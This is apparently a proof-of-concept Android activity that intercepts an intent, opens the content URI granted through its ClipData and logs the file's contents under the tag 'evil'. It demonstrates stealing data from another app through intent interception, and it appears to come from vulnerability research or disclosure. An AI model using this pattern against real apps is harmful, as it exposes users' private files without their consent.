package poc.app;

import android.app.Activity;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import org.apache.commons.io.IOUtils;

import java.io.InputStream;

public class InterceptActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Uri uri = getIntent().getClipData().getItemAt(0).getUri();
        try (InputStream inputStream = getContentResolver().openInputStream(uri)) {
            Log.d("evil", IOUtils.toString(inputStream));
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }
}
